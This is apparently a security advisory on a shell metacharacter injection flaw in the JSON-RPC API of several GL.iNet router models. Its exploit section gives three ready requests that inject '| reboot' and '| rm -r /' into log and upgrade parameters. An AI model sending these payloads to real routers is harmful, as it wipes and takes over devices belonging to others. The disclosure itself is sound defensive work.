# Using Shell Metacharacter Injection via API

## Description

This report describes the Shell Metacharacter Injection vulnerability discovered in Glinet products. The vulnerability exists in the get_system_log and get_crash_log functions of the logread module, as well as the upgrade_online function of the upgrade module. It allows execution of malicious shell commands through externally provided parameters, thereby enabling control over the related products.

## Affected Product

A1300 /AX1800 /AXT1800 /MT3000 /MT2500 /MT6000 /MT1300 /MT300N-V2 /AR750S /AR750 /AR300M /B1300 

## Affected Firmware Version

4.3.7/4.4.6/4.5.0 Affected, fixed in 4.5.0

## Exploit

Attackers can manipulate routers by passing malicious shell commands through the API.

```json
{
	"jsonrpc": "2.0",
	"id": 11,
	"method": "call",
	"params": [
		"wX4ByM4cncp113pPrGxlrm2Q6svU1Apx",
		"logread",
		"get_system_log",
		{
			"lines": "| reboot",
			"module": "| rm -r /"
		}
	]
}

{
	"jsonrpc": "2.0",
	"id": 11,
	"method": "call",
	"params": [
		"wX4ByM4cncp113pPrGxlrm2Q6svU1Apx",
		"logread",
		"get_crash_log",
		{
			"mode": "| reboot",
			"log_number": "| rm -r /"
		}
	]
}

{
	"jsonrpc": "2.0",
	"id": 11,
	"method": "call",
	"params": [
		"wX4ByM4cncp113pPrGxlrm2Q6svU1Apx",
		"upgrade",
		"upgrade_online",
		{
			"url": "| reboot",
			"sha256": "| rm -r /",
			"keep_config": "| reboot",
			"keep_package": "| rm -r /"
		}
	]
}
```

## Impact

Attackers that successfully exploit this vulnerability gain complete control of the router.
